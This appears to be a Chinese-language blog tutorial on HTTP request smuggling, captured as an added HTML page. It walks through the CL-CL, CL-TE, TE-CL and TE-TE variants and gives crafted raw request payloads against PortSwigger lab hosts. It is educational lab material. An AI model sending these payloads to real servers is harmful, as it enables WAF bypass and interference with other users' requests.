@@ -1,0 +1,477 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>HTTP 请求走私 - Geekby&#39;s Blog</title><meta name="Description" content="HTTP 请求走私"><meta property="og:title" content="HTTP 请求走私" />
+<meta property="og:description" content="HTTP 请求走私" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.geekby.site/2020/09/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2020-09-15T15:09:00+08:00" />
+<meta property="article:modified_time" content="2020-09-15T15:09:00+08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="HTTP 请求走私"/>
+<meta name="twitter:description" content="HTTP 请求走私"/>
+<meta name="application-name" content="Geekby&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Geekby&#39;s Blog"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://www.geekby.site/2020/09/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/" /><link rel="prev" href="https://www.geekby.site/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/" /><link rel="next" href="https://www.geekby.site/2020/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "HTTP 请求走私",
+        "inLanguage": "zh-cn",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/www.geekby.site\/2020\/09\/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81\/"
+        },"image": ["https:\/\/www.geekby.site\/logo.png"],"genre": "posts","keywords": "渗透测试","wordcount":  461 ,
+        "url": "https:\/\/www.geekby.site\/2020\/09\/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81\/","datePublished": "2020-09-15T15:09:00+08:00","dateModified": "2020-09-15T15:09:00+08:00","publisher": {
+            "@type": "Organization",
+            "name": "Geekby","logo": {
+                    "@type": "ImageObject",
+                    "url": "https:\/\/www.geekby.site\/images\/avatar.png",
+                    "width":  358 ,
+                    "height":  330 
+                }},"author": {
+                "@type": "Person",
+                "name": "Geekby"
+            },"description": "HTTP 请求走私"
+    }
+    </script></head>
+    <body header-desktop="" header-mobile=""><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Geekby&#39;s Blog">Geekby&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/" title="文章"><i class="fas fa-inbox"></i> 文章 </a><a class="menu-item" href="/tags/" title="标签"><i class="fas fa-tags"></i> 标签 </a><a class="menu-item" href="/categories/" title="分类"><i class="fas fa-sort-amount-up-alt"></i> 分类 </a><a class="menu-item" href="/about/" title="关于"><i class="far fa-address-card"></i> 关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="输入关键字" id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Geekby&#39;s Blog">Geekby&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="输入关键字" id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="文章"><i class="fas fa-inbox"></i>文章</a><a class="menu-item" href="/tags/" title="标签"><i class="fas fa-tags"></i>标签</a><a class="menu-item" href="/categories/" title="分类"><i class="fas fa-sort-amount-up-alt"></i>分类</a><a class="menu-item" href="/about/" title="关于"><i class="far fa-address-card"></i>关于</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">HTTP 请求走私</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Geekby</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><i class="far fa-folder fa-fw"></i>渗透测试</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-09-15">2020-09-15</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 461 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 3 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-前言">1 前言</a>
+      <ul>
+        <li><a href="#11-keep-alive">1.1 Keep-Alive</a></li>
+        <li><a href="#12-pipeline">1.2 Pipeline</a></li>
+        <li><a href="#13-原理">1.3 原理</a></li>
+      </ul>
+    </li>
+    <li><a href="#2-实例">2 实例</a>
+      <ul>
+        <li><a href="#21-cl-不为-0-的-get-请求">2.1 CL 不为 0 的 GET 请求</a></li>
+        <li><a href="#22-cl-cl">2.2 CL-CL</a></li>
+        <li><a href="#23-cl-te">2.3 CL-TE</a></li>
+        <li><a href="#24-te-cl">2.4 TE-CL</a></li>
+        <li><a href="#25-te-te">2.5 TE-TE</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="http-请求走私">HTTP 请求走私</h1>
+<h2 id="1-前言">1 前言</h2>
+<h3 id="11-keep-alive">1.1 Keep-Alive</h3>
+<p>在 HTTP 1.0 之前的协议设计中，客户端每进行一次 HTTP 请求，就需要同服务器建立一个 TCP 链接。而现代的 Web 网站页面是由多种资源组成的，我们要获取一个网页的内容，不仅要请求 HTML 文档，还有 JS、CSS、图片等各种各样的资源，这样如果按照之前的协议设计，就会导致 HTTP 服务器的负载开销增大。于是在 HTTP 1.1 中，增加了 Keep-Alive 和 Pipeline 这两个特性。</p>
+<p>Keep-Alive 是什么？就是在 HTTP 请求中增加一个特殊的请求头 Connection: Keep-Alive，告诉服务器，接收完这次 HTTP 请求后，不要关闭 TCP 链接，后面对相同目标服务器的 HTTP 请求，重用这一个 TCP 链接，这样只需要进行一次  TCP 握手的过程，可以减少服务器的开销，节约资源，还能加快访问速度。当然，这个特性在 HTTP 1.1 中是默认开启的。</p>
+<h3 id="12-pipeline">1.2 Pipeline</h3>
+<p>有了 Keep-Alive 之后，后续就有了Pipeline，在这里呢，客户端可以像流水线一样发送自己的 HTTP 请求，而不需要等待服务器的响应，服务器那边接收到请求后，需要遵循先入先出机制，将请求和响应严格对应起来，再将响应发送给客户端。现在，浏览器默认是不启用 Pipeline 的，但是一般的服务器都提供了对 Pipeline 的支持。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200915141458.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200915141458.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200915141458.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200915141458.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200915141458.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200915141458.png-water_print" /></p>
+<h3 id="13-原理">1.3 原理</h3>
+<p>反向代理服务器与后端的源站服务器之间，会重用 TCP 链接，因为代理服务器与后端的源站服务器的 IP 地址是相对固定，不同用户的请求通过代理服务器与源站服务器建立链接，所以就顺理成章了。</p>
+<p>但是由于两者服务器的实现方式不同，如果用户提交模糊的请求可能代理服务器认为这是一个 HTTP 请求，然后将其转发给了后端的源站服务器，但源站服务器经过解析处理后，只认为其中的一部分为正常请求，剩下的那一部分就是走私的请求了，这就是 HTTP 走私请求的由来。</p>
+<p>HTTP 请求走私漏洞的原因是由于 HTTP 规范提供了两种不同方式来指定请求的结束位置，它们是 <code>Content-Length</code> 标头和 <code>Transfer-Encoding</code> 标头，<code>Content-Length </code>标头简单明了，它以字节为单位指定消息内容体的长度。</p>
+<p><code>Transfer-Encoding </code>标头用于指定消息体使用分块编码（Chunked Encode），也就是说消息报文由一个或多个数据块组成，每个数据块大小以字节为单位（十六进制表示） 衡量，后跟换行符，然后是块内容，最重要的是：整个消息体以大小为 0 的块结束，也就是说解析遇到 0 数据块就结束。如：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-HTTP" data-lang="HTTP"><span class="nf">POST</span> <span class="nn">/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="n">Host</span><span class="o">:</span> <span class="l">ac6f1ff11e5c7d4e806912d000080058.web-security-academy.net</span>
+<span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
+<span class="n">Transfer-Encoding</span><span class="o">:</span> <span class="l">chunked</span>
+<span class="err">b</span>
+
+a=11
+
+0
+</code></pre></td></tr></table>
+</div>
+</div><p>其实理解起来真的很简单，相当于我发送请求，包含<code>Content-Length</code>，前端服务器解析后没有问题发送给后端服务器，但是我在请求时后面还包含了<code>Transfer-Encoding</code>，这样后端服务器进行解析便可执行我写在下面的一些命令，这样便可以绕过前端的 waf。</p>
+<h2 id="2-实例">2 实例</h2>
+<h3 id="21-cl-不为-0-的-get-请求">2.1 CL 不为 0 的 GET 请求</h3>
+<p>假设前端代理服务器允许 GET 请求携带请求体，而后端服务器不允许 GET 请求携带请求体，它会直接忽略掉 GET 请求中的 <code>Content-Length</code> 头，不进行处理。这就有可能导致请求走私。</p>
+<p>比如我们构造请求：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="err">GET / HTTP/1.1\r\n
+</span><span class="err">Host: example.com\r\n
+</span><span class="err">Content-Length: 44\r\n
+</span><span class="err">
+</span><span class="err">GET / secret HTTP/1.1\r\n
+</span><span class="err">Host: example.com\r\n
+</span><span class="err">\r\n
+</span></code></pre></td></tr></table>
+</div>
+</div><p>前端服务器收到该请求，通过读取 <code>Content-Length</code>，判断这是一个完整的请求，然后转发给后端服务器，而后端服务器收到后，因为它不对 <code>Content-Length</code> 进行处理，由于 <code>Pipeline</code> 的存在，它就认为这是收到了两个请求，分别是</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="err"># 第一个
+</span><span class="err">GET / HTTP/1.1\r\n
+</span><span class="err">Host: example.com\r\n
+</span><span class="err">
+</span><span class="err"># 第二个
+</span><span class="err">GET /secret HTTP/1.1\r\n
+</span><span class="err">Host: example.com\r\n
+</span></code></pre></td></tr></table>
+</div>
+</div><h3 id="22-cl-cl">2.2 CL-CL</h3>
+<p>在 <code>RFC7230</code> 的第 <code>3.3.3</code> 节中的第四条中，规定当服务器收到的请求中包含两个 <code>Content-Length</code>，而且两者的值不同时，需要返回 400 错误。</p>
+<p>但是总有服务器不会严格的实现该规范，假设中间的代理服务器和后端的源站服务器在收到类似的请求时，都不会返回 400 错误，但是中间代理服务器按照第一个 <code>Content-Length</code> 的值对请求进行处理，而后端源站服务器按照第二个 <code>Content-Length</code> 的值进行处理。</p>
+<p>此时恶意攻击者可以构造一个特殊的请求：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="err">POST / HTTP/1.1\r\n
+</span><span class="err">Host: example.com\r\n
+</span><span class="err">Content-Length: 8\r\n
+</span><span class="err">Content-Length: 7\r\n
+</span><span class="err">
+</span><span class="err">12345\r\n
+</span><span class="err">a
+</span></code></pre></td></tr></table>
+</div>
+</div><p>中间代理服务器获取到的数据包的长度为 8，将上述整个数据包原封不动的转发给后端的源站服务器，而后端服务器获取到的数据包长度为 7。当读取完前 7个字符后，后端服务器认为已经读取完毕，然后生成对应的响应，发送出去。而此时的缓冲区去还剩余一个字母 <code>a</code>，对于后端服务器来说，这个 <code>a</code> 是下一个请求的一部分，但是还没有传输完毕。此时恰巧有一个其它的正常用户对服务器进行了请求，假设请求如图所示：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="err">GET /index.html HTTP/1.1\r\n
+</span><span class="err">Host: example.com\r\n
+</span></code></pre></td></tr></table>
+</div>
+</div><p>从前面我们也知道了，代理服务器与源站服务器之间一般会重用 TCP 连接。</p>
+<p>这时候正常用户的请求就拼接到了字母 <code>a</code> 的后面，当后端服务器接收完毕后，它实际处理的请求其实是：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="err">aGET /index.html HTTP/1.1\r\n
+</span><span class="err">Host: example.com\r\n
+</span></code></pre></td></tr></table>
+</div>
+</div><p>这时候用户就会收到一个类似于 <code>aGET request method not found</code> 的报错。这样就实现了一次 HTTP 走私攻击，而且还对正常用户的行为造成了影响，而且后续可以扩展成类似于 CSRF 的攻击方式。</p>
+<p>但是两个 <code>Content-Length</code> 这种请求包还是太过于理想化了，一般的服务器都不会接受这种存在两个请求头的请求包。但是在 <code>RFC2616</code> 的第 4.4 节中，规定:<code>如果收到同时存在 Content-Length 和 Transfer-Encoding 这两个请求头的请求包时，在处理的时候必须忽略 Content-Length</code>，这其实也就意味着请求包中同时包含这两个请求头并不算违规，服务器也不需要返回 <code>400</code> 错误。服务器在这里的实现更容易出问题。</p>
+<h3 id="23-cl-te">2.3 CL-TE</h3>
+<p>所谓<code>CL-TE</code>，就是当收到存在两个请求头的请求包时，前端代理服务器只处理 <code>Content-Length</code> 这一请求头，而后端服务器会遵守 <code>RFC2616</code> 的规定，忽略掉 <code>Content-Length</code>，处理 <code>Transfer-Encoding</code> 这一请求头。</p>
+<p>chunk 传输数据格式如下，其中 size 的值由 16 进制表示。</p>
+<p>Lab 地址：<a href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te" target="_blank" rel="noopener noreffer">https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te</a></p>
+<p>构造数据包：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="err">POST / HTTP/1.1\r\n
+</span><span class="err">Host: ace01fcf1fd05faf80c21f8b00ea006b.web-security-academy.net\r\n
+</span><span class="err">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n
+</span><span class="err">Accept-Language: en-US,en;q=0.5\r\n
+</span><span class="err">Cookie: session=E9m1pnYfbvtMyEnTYSe5eijPDC04EVm3\r\n
+</span><span class="err">Connection: keep-alive\r\n
+</span><span class="err">Content-Length: 6\r\n
+</span><span class="err">Transfer-Encoding: chunked\r\n
+</span><span class="err">\r\n
+</span><span class="err">0\r\n
+</span><span class="err">\r\n
+</span><span class="err">G
+</span></code></pre></td></tr></table>
+</div>
+</div><p>连续发送几次请求就可以获得该响应：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200915143924.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200915143924.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200915143924.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200915143924.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200915143924.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200915143924.png-water_print" /></p>
+<h3 id="24-te-cl">2.4 TE-CL</h3>
+<p>所谓 <code>TE-CL</code>，就是当收到存在两个请求头的请求包时，前端代理服务器处理 <code>Transfer-Encoding</code> 这一请求头，而后端服务器处理 <code>Content-Length</code> 请求头。</p>
+<p>Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl" target="_blank" rel="noopener noreffer">https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl</a></p>
+<p>构造数据包：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="err">POST / HTTP/1.1\r\n
+</span><span class="err">Host: ac041f531eabd0cd804edb62000c0025.web-security-academy.net\r\n
+</span><span class="err">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n
+</span><span class="err">Accept-Language: en-US,en;q=0.5\r\n
+</span><span class="err">Cookie: session=3Eyiu83ZSygjzgAfyGPn8VdGbKw5ifew\r\n
+</span><span class="err">Content-Length: 4\r\n
+</span><span class="err">Transfer-Encoding: chunked\r\n
+</span><span class="err">\r\n
+</span><span class="err">12\r\n
+</span><span class="err">GPOST / HTTP/1.1\r\n
+</span><span class="err">\r\n
+</span><span class="err">0\r\n
+</span><span class="err">\r\n
+</span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200915145641.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200915145641.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200915145641.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200915145641.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200915145641.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200915145641.png-water_print" /></p>
+<p>由于前端服务器处理 <code>Transfer-Encoding</code>，当其读取到 <code>0\r\n\r\n</code>时，认为是读取完毕了，此时这个请求对代理服务器来说是一个完整的请求，然后转发给后端服务器，后端服务器处理 <code>Content-Length</code> 请求头，当它读取完 <code>5c\r\n</code> 之后，就认为这个请求已经结束了，后面的数据就认为是另一个请求了，也就是：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="err">G</span><span class="nf">POST</span> <span class="nn">/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
+<span class="n">Content-Length</span><span class="o">:</span> <span class="l">15</span>
+
+x=1
+0
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="25-te-te">2.5 TE-TE</h3>
+<p><code>TE-TE</code>，也很容易理解，当收到存在两个请求头的请求包时，前后端服务器都处理 <code>Transfer-Encoding</code> 请求头，这确实是实现了 RFC 的标准。不过前后端服务器毕竟不是同一种，这就有了一种方法，我们可以对发送的请求包中的 <code>Transfer-Encoding</code> 进行某种混淆操作，从而使其中一个服务器不处理 <code>Transfer-Encoding</code> 请求头。从某种意义上还是 <code>CL-TE</code> 或者 <code>TE-CL</code>。</p>
+<p>Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header" target="_blank" rel="noopener noreffer">https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header</a></p>
+<p>构造数据包：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="err">POST / HTTP/1.1\r\n
+</span><span class="err">Host: ac4b1fcb1f596028803b11a2007400e4.web-security-academy.net\r\n
+</span><span class="err">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0\r\n
+</span><span class="err">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n
+</span><span class="err">Accept-Language: en-US,en;q=0.5\r\n
+</span><span class="err">Cookie: session=Mew4QW7BRxkhk0p1Thny2GiXiZwZdMd8\r\n
+</span><span class="err">Content-length: 4\r\n
+</span><span class="err">Transfer-Encoding: chunked\r\n
+</span><span class="err">Transfer-encoding: cow\r\n
+</span><span class="err">\r\n
+</span><span class="err">5c\r\n
+</span><span class="err">GPOST / HTTP/1.1\r\n
+</span><span class="err">Content-Type: application/x-www-form-urlencoded\r\n
+</span><span class="err">Content-Length: 15\r\n
+</span><span class="err">\r\n
+</span><span class="err">x=1\r\n
+</span><span class="err">0\r\n
+</span><span class="err">\r\n
+</span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200915150153.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200915150153.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200915150153.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200915150153.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200915150153.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200915150153.png-water_print" /></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2020-09-15</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://www.geekby.site/2020/09/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/" data-title="HTTP 请求走私"><i class="fab fa-weibo fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Evernote" data-sharer="evernote" data-url="https://www.geekby.site/2020/09/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/" data-title="HTTP 请求走私"><i class="fab fa-evernote fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Skype" data-sharer="skype" data-url="https://www.geekby.site/2020/09/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/" data-title="HTTP 请求走私"><i class="fab fa-skype fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/" class="prev" rel="prev" title="内网隧道穿透"><i class="fas fa-angle-left fa-fw"></i>内网隧道穿透</a>
+            <a href="/2020/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" class="next" rel="next" title="权限维持">权限维持<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
